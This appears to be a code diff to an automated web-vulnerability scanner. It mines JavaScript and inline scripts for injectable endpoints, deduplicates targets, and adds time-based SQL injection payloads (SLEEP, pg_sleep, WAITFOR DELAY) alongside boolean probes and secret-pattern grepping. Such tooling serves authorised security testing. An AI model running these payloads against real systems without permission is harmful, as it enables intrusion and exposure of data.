@@ -118,6 +118,65 @@ async def run_xss_pipeline(req: PipelineRequest):
         "message": f"Found {len(all_results)} URLs — {len(param_urls)} XSS candidates",
     })
 
+    # Phase 1b: mine endpoints from JS files and inline <script> tags
+    if opts.get("parse_js", True):
+        cookie_xss = opts.get("cookie", "") or None
+        js_files_xss = [r["url"] for r in all_results if r["url"].split("?")[0].endswith(".js")]
+        _SKIP_XSS = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                     ".webp", ".ico", ".woff", ".woff2", ".ttf", ".pdf", ".zip", ".mp4")
+        html_pages_xss = list({r["url"] for r in all_results
+                                if not r["url"].split("?")[0].lower().endswith(_SKIP_XSS)})[:120]
+        if js_files_xss or html_pages_xss:
+            await ws_manager.broadcast("pipeline", {
+                "phase": "js_parse", "event": "started", "pipeline": "xss",
+                "message": f"Mining {len(js_files_xss)} JS + {len(html_pages_xss)} pages for hidden XSS candidates...",
+            })
+            existing_xss = {r["url"] for r in param_results}
+            extra_xss: set[str] = set()
+            workers_xss = int(opts.get("workers", 5))
+
+            def _collect_xss(content: str, src: str):
+                for ep in _extract_js_endpoints(content, src):
+                    if "?" in ep and parse_qs(urlparse(ep).query) and ep not in existing_xss:
+                        extra_xss.add(ep)
+
+            for i in range(0, len(js_files_xss), workers_xss):
+                chunk = js_files_xss[i:i + workers_xss]
+                contents = await asyncio.gather(*[_fetch_js(u, cookie_xss) for u in chunk])
+                for u, c in zip(chunk, contents):
+                    if c:
+                        _collect_xss(c, u)
+
+            for i in range(0, len(html_pages_xss), workers_xss):
+                chunk = html_pages_xss[i:i + workers_xss]
+                contents = await asyncio.gather(*[_fetch_js(u, cookie_xss) for u in chunk])
+                for u, c in zip(chunk, contents):
+                    if c:
+                        inline = _extract_inline_scripts(c)
+                        if inline:
+                            _collect_xss(inline, u)
+
+            param_urls = param_urls + list(extra_xss)
+            await ws_manager.broadcast("pipeline", {
+                "phase": "js_parse", "event": "completed", "pipeline": "xss",
+                "js_endpoints": len(extra_xss),
+                "message": f"JS mining added {len(extra_xss)} more XSS candidate(s)",
+            })
+
+    # Dedup by path + sorted param names — avoids scanning ?id=1 and ?id=2 as separate targets
+    def _ep_sig(u: str) -> str:
+        p = urlparse(u)
+        return f"{p.scheme}://{p.netloc}{p.path}?{'&'.join(sorted(parse_qs(p.query).keys()))}"
+
+    seen_sigs: set[str] = set()
+    deduped_xss: list[str] = []
+    for u in param_urls:
+        sig = _ep_sig(u)
+        if sig not in seen_sigs:
+            seen_sigs.add(sig)
+            deduped_xss.append(u)
+    param_urls = deduped_xss
+
     if not param_urls:
         return {"status": "completed", "total_urls": len(all_results), "xss_candidates": 0, "findings": 0}
 
@@ -332,12 +391,20 @@ def _extract_js_endpoints(js_content: str, base_url: str) -> list[str]:
     return list(found)
 
 
+# DB-specific time payloads: (db_name, sleep_payload, zero_payload)
+_TIME_PAYLOADS = [
+    ("MySQL",      "/**/AND/**/SLEEP(7)-- -",                              "/**/AND/**/SLEEP(0)-- -"),
+    ("PostgreSQL", "/**/AND/**/(SELECT(1)FROM/**/pg_sleep(7))-- -",        "/**/AND/**/(SELECT(1)FROM/**/pg_sleep(0))-- -"),
+    ("MSSQL",      ";WAITFOR DELAY '0:0:7'-- -",                           ";WAITFOR DELAY '0:0:0'-- -"),
+]
+
+
 async def _probe_sqli(url: str, cookie: str | None) -> list[dict]:
     """
     3-layer SQLi detection per parameter, params probed in priority order:
       1. Error-based: inject ' and match DB error signatures
-      2. Boolean-based: AND 1=1 vs AND 1=2, flag when response sizes diverge
-      3. Time-based: AND SLEEP(7), flag when it stalls but SLEEP(0) baseline is fast
+      2. Boolean-based: AND 1=1 vs AND 1=2, flag when responses diverge
+      3. Time-based: multi-DB sleep payloads vs measured URL baseline time
     """
     import httpx
     import time
@@ -358,13 +425,16 @@ async def _probe_sqli(url: str, cookie: str | None) -> list[dict]:
         return urlunparse(parsed._replace(query=urlencode(test_params)))
 
     async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12) as client:
-        # Baseline response for the unmodified URL (boolean comparison)
+        # Baseline: content length + response time for this specific URL
         try:
+            t_base = time.monotonic()
             base_resp = await client.get(url, headers=headers)
+            url_base_time = time.monotonic() - t_base
             base_len = len(base_resp.text)
         except Exception as e:
             logger.debug(f"SQLi baseline failed for {url}: {e}")
             base_len = None
+            url_base_time = 0.5
 
         for param_name in _classify_params(params):
             found_for_param = False
@@ -393,42 +463,46 @@ async def _probe_sqli(url: str, cookie: str | None) -> list[dict]:
                     r_true = await client.get(true_url, headers=headers)
                     r_false = await client.get(false_url, headers=headers)
                     lt, lf = len(r_true.text), len(r_false.text)
-                    # TRUE close to baseline, FALSE clearly different → boolean injection
-                    if abs(lt - base_len) < 50 and abs(lt - lf) > max(60, base_len * 0.05):
+                    # TRUE within 3% of baseline; FALSE diverges from TRUE by 5%+
+                    if abs(lt - base_len) < max(50, base_len * 0.03) and abs(lt - lf) > max(60, max(lt, lf) * 0.05):
                         findings.append({
                             "url": true_url, "original_url": url, "parameter": param_name,
                             "payload": "AND 1=1 / AND 1=2", "status_code": r_true.status_code,
-                            "evidence": f"baseline={base_len}B  true(1=1)={lt}B  false(1=2)={lf}B",
+                            "evidence": f"baseline={base_len}B  true={lt}B  false={lf}B  delta={abs(lt - lf)}B",
                             "type": "sqli_boolean", "method": "boolean-based",
                         })
                         found_for_param = True
                 except Exception as e:
                     logger.debug(f"SQLi boolean-probe failed for {param_name}: {e}")
 
-            # ── Layer 3: time-based (expensive — only if nothing found yet) ──
+            # ── Layer 3: time-based — MySQL / PostgreSQL / MSSQL ──
             if not found_for_param:
-                try:
-                    sleep_url = build(param_name, "/**/AND/**/SLEEP(7)-- -")
-                    t0 = time.monotonic()
-                    r_sleep = await client.get(sleep_url, headers=headers)
-                    elapsed = time.monotonic() - t0
-                    if elapsed > 6:
-                        # Confirm with SLEEP(0) — baseline must come back fast
-                        base_url2 = build(param_name, "/**/AND/**/SLEEP(0)-- -")
-                        t1 = time.monotonic()
-                        await client.get(base_url2, headers=headers)
-                        base_elapsed = time.monotonic() - t1
-                        if base_elapsed < 3:
-                            findings.append({
-                                "url": sleep_url, "original_url": url, "parameter": param_name,
-                                "payload": "AND SLEEP(7)", "status_code": r_sleep.status_code,
-                                "evidence": f"SLEEP(7)={elapsed:.1f}s  SLEEP(0)={base_elapsed:.1f}s",
-                                "type": "sqli_time", "method": "time-based",
-                            })
-                except httpx.TimeoutException:
-                    logger.debug(f"SQLi time-probe timed out for {param_name} (possible injection)")
-                except Exception as e:
-                    logger.debug(f"SQLi time-probe failed for {param_name}: {e}")
+                # Require at least 5s more than the baseline response time to avoid false positives on slow servers
+                min_delta = max(6.0, url_base_time + 5.0)
+                for db_name, sleep_pay, zero_pay in _TIME_PAYLOADS:
+                    if found_for_param:
+                        break
+                    try:
+                        t0 = time.monotonic()
+                        r_sleep = await client.get(build(param_name, sleep_pay), headers=headers)
+                        elapsed = time.monotonic() - t0
+                        if elapsed > min_delta:
+                            t1 = time.monotonic()
+                            await client.get(build(param_name, zero_pay), headers=headers)
+                            zero_t = time.monotonic() - t1
+                            if zero_t < url_base_time + 2:
+                                findings.append({
+                                    "url": build(param_name, sleep_pay), "original_url": url,
+                                    "parameter": param_name,
+                                    "payload": sleep_pay.strip(), "status_code": r_sleep.status_code,
+                                    "evidence": f"sleep={elapsed:.1f}s  zero={zero_t:.1f}s  baseline={url_base_time:.1f}s  db={db_name}",
+                                    "type": "sqli_time", "method": "time-based", "db_hint": db_name,
+                                })
+                                found_for_param = True
+                    except httpx.TimeoutException:
+                        logger.debug(f"SQLi time-probe timed out for {param_name} ({db_name})")
+                    except Exception as e:
+                        logger.debug(f"SQLi time-probe failed for {param_name} ({db_name}): {e}")
 
     return findings
 
@@ -583,6 +657,7 @@ _JS_PATTERNS: list[tuple[re.Pattern, str, str]] = [
     (re.compile(r'(?i)["\']/(api|v\d+|internal|admin|graphql|rest|backend|swagger|debug)[/a-zA-Z0-9\-_?=&]{2,50}["\']'), "internal_endpoint", "info"),
     (re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'), "email", "info"),
     (re.compile(r's3\.amazonaws\.com/([a-zA-Z0-9\-_\.]+)'), "s3_bucket", "medium"),
+    (re.compile(r'(?i)["\']/?graphql[/?\"\']'), "graphql_endpoint", "info"),
 ]
 
 
@@ -603,21 +678,42 @@ async def _fetch_js(url: str, cookie: str | None) -> str | None:
 
 
 def _grep_js(url: str, content: str) -> list[dict]:
-    """Run all secret patterns against JS content."""
+    """Scan whole content at once (handles minified single-line bundles), with entropy filter."""
+    import bisect, math
+
+    # Build line-start index for O(log n) byte-position -> line number
+    line_starts = [0]
+    for lm in re.finditer(r'\n', content):
+        line_starts.append(lm.end())
+
+    _SECRET_LABELS = {"api_key", "token", "secret", "password"}
     findings = []
-    lines = content.splitlines()
-    for lineno, line in enumerate(lines, 1):
-        for pattern, label, severity in _JS_PATTERNS:
-            match = pattern.search(line)
-            if match:
-                findings.append({
-                    "js_url": url,
-                    "line": lineno,
-                    "label": label,
-                    "severity": severity,
-                    "match": match.group(0)[:200],
-                    "context": line.strip()[:300],
-                })
+    seen: set[tuple] = set()
+
+    for pattern, label, severity in _JS_PATTERNS:
+        for m in pattern.finditer(content):
+            val = m.group(0)
+            # Skip low-entropy matches for secret-type labels (filters placeholders like "your_api_key")
+            if label in _SECRET_LABELS and severity in ("high", "critical") and len(val) >= 8:
+                n = len(val)
+                ent = -sum((val.count(c) / n) * math.log2(val.count(c) / n) for c in set(val))
+                if ent < 3.5:
+                    continue
+            key = (label, val[:80])
+            if key in seen:
+                continue
+            seen.add(key)
+            lineno = bisect.bisect_right(line_starts, m.start())
+            start, end = max(0, m.start() - 60), min(len(content), m.end() + 60)
+            findings.append({
+                "js_url": url,
+                "line": lineno,
+                "label": label,
+                "severity": severity,
+                "match": val[:200],
+                "context": content[start:end].replace('\n', ' ').strip()[:300],
+            })
+
     return findings
 
 
@@ -688,6 +784,38 @@ async def run_js_scan_pipeline(req: PipelineRequest):
             if content:
                 findings = _grep_js(url, content)
                 for f in findings:
+                    all_findings.append(f)
+                    await ws_manager.broadcast("pipeline", {
+                        "phase": "js_scan", "event": "finding",
+                        "pipeline": "js_scan",
+                        "finding": f,
+                        "total_findings": len(all_findings),
+                    })
+
+    # Phase 2b: inline <script> tags from HTML pages
+    _SKIP_HTML = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                  ".webp", ".ico", ".woff", ".woff2", ".ttf", ".pdf", ".zip", ".mp4")
+    html_scan_urls = list({
+        r["url"] for r in all_results
+        if not r["url"].split("?")[0].lower().endswith(_SKIP_HTML)
+    })[:80]
+
+    if html_scan_urls:
+        await ws_manager.broadcast("pipeline", {
+            "phase": "js_scan", "event": "started",
+            "pipeline": "js_scan",
+            "message": f"Scanning inline <script> in {len(html_scan_urls)} pages...",
+        })
+        for i in range(0, len(html_scan_urls), workers):
+            chunk = html_scan_urls[i:i + workers]
+            contents = await asyncio.gather(*[_fetch_js(u, cookie) for u in chunk])
+            for page_url, content in zip(chunk, contents):
+                if not content:
+                    continue
+                inline = _extract_inline_scripts(content)
+                if not inline:
+                    continue
+                for f in _grep_js(page_url, inline):
                     all_findings.append(f)
                     await ws_manager.broadcast("pipeline", {
                         "phase": "js_scan", "event": "finding",
